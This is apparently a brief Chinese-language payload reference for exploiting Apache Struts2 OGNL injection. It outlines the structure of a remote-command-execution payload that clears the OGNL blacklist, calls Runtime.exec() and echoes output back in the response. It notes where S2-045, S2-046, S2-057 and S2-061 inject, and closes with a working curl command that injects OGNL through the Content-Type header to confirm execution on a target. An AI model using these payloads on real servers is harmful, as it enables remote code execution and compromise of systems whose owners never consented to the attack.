# Struts2 OGNL Payload 参考

## 回显 Payload 核心结构

```
#_memberAccess 绕过 → 清空 excludedClasses/Packages → Runtime.exec()
```

关键组件：
1. `#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS` — 获取默认访问权限
2. `#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)` — 获取 OgnlUtil
3. `getExcludedPackageNames().clear()` — 清空黑名单
4. `setMemberAccess(#dm)` — 恢复成员访问
5. `Runtime.getRuntime().exec(cmd)` — 执行命令
6. `IOUtils.copy(process.getInputStream(), response.getOutputStream())` — 回显输出

## 各版本差异

- S2-045: Content-Type 头注入，multipart 解析异常时触发
- S2-046: Content-Disposition filename 注入，类似 S2-045 但注入点不同
- S2-057: URL namespace 注入，`alwaysSelectFullNamespace=true` 时可用
- S2-061: 标签属性二次 OGNL 求值

## 快速验证 Payload

```bash
# 注入自定义响应头验证 OGNL 是否执行成功
curl -s -D - {target} \
  -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-OGNL-RCE','confirmed')}.multipart/form-data" \
  | grep "X-OGNL-RCE"
```
